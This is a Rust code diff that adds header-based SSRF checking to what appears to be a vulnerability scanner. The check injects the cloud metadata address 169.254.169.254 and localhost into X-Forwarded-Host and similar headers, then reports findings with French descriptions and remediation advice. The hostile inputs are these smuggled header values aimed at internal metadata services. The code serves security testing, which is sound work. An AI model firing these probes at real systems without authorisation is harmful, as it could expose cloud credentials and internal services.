@@ -52,6 +52,16 @@ const PROBES: &[SsrfProbe] = &[
     },
 ];
 
+/// HTTP headers that may be used to inject SSRF targets
+const SSRF_HEADERS: &[&str] = &[
+    "X-Forwarded-Host",
+    "X-Forwarded-For",
+    "X-Real-IP",
+    "X-Originating-IP",
+    "True-Client-IP",
+    "X-Client-IP",
+];
+
 /// Parameter names commonly used to pass URLs — prime SSRF candidates
 const URL_PARAMS: &[&str] = &[
     "url", "uri", "redirect", "redirect_url", "redirect_uri", "next", "return",
@@ -112,6 +122,11 @@ impl AttackModule for SsrfModule {
                     findings.push(f);
                     break; // one finding per endpoint is enough
                 }
+            }
+
+            // Header-based SSRF
+            if let Some(f) = check_header_ssrf(client, ep).await {
+                findings.push(f);
             }
         }
 
@@ -233,6 +248,82 @@ fn urlenc(s: &str) -> String {
         }
     }
     out
+}
+
+// ---------------------------------------------------------------------------
+// Check: SSRF via HTTP headers (X-Forwarded-Host, etc.)
+// ---------------------------------------------------------------------------
+
+async fn check_header_ssrf(client: &HttpClient, ep: &Endpoint) -> Option<Finding> {
+    // Only probe a subset of cloud IMDS endpoints to keep tests fast
+    let header_probes = [
+        ("http://169.254.169.254/", &["ami-id", "instance-id", "local-ipv4", "iam"][..]),
+        ("http://localhost/", &["localhost", "127.0.0.1"][..]),
+    ];
+
+    for (probe_url, indicators) in &header_probes {
+        for header_name in SSRF_HEADERS {
+            let method: reqwest::Method = ep.method.parse().unwrap_or(reqwest::Method::GET);
+            let Ok(req) = client
+                .inner()
+                .request(method, &ep.full_url)
+                .header(*header_name, *probe_url)
+                .build()
+            else {
+                continue;
+            };
+
+            let Ok(resp) = client.send(req).await else { continue };
+            let status = resp.status().as_u16();
+            let body = resp.text().await.unwrap_or_default();
+            let body_lower = body.to_lowercase();
+
+            let confirmed = indicators.iter().any(|i| body_lower.contains(i));
+            let probable = !confirmed
+                && status == 200
+                && body.len() > 50
+                && body_lower.contains("169.254");
+
+            if confirmed || probable {
+                let severity = if confirmed { Severity::Critical } else { Severity::High };
+                let cvss = if confirmed { 9.8 } else { 7.5 };
+                let confidence = if confirmed { "Confirmé" } else { "Probable" };
+
+                let mut f = Finding::new(
+                    format!("SSRF via header `{}` — {}", header_name, ep.full_url),
+                    severity,
+                    cvss,
+                    "ssrf",
+                    ep.full_url.clone(),
+                    ep.method.clone(),
+                );
+                f.description = format!(
+                    "Le header HTTP `{}` est utilisé pour déclencher une requête interne vers `{}`. \
+                     Un attaquant peut accéder aux métadonnées cloud ou à des services internes \
+                     en injectant des IPs privées dans ce header.",
+                    header_name, probe_url
+                );
+                f.proof = format!(
+                    "{} — `{}: {}` → HTTP {} avec indicateurs dans la réponse: {}",
+                    confidence, header_name, probe_url, status,
+                    body.chars().take(200).collect::<String>()
+                );
+                f.recommendation =
+                    "Ne jamais faire confiance aux headers X-Forwarded-* pour construire des URLs \
+                     internes. Valider et normaliser les IPs sources côté infrastructure. \
+                     Bloquer les plages d'adresses privées au niveau du pare-feu."
+                        .to_string();
+                f.cwe = Some("CWE-918".to_string());
+                f.references = vec![
+                    "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery".to_string(),
+                    "https://portswigger.net/web-security/ssrf".to_string(),
+                ];
+                return Some(f);
+            }
+        }
+    }
+
+    None
 }
 
 // ---------------------------------------------------------------------------
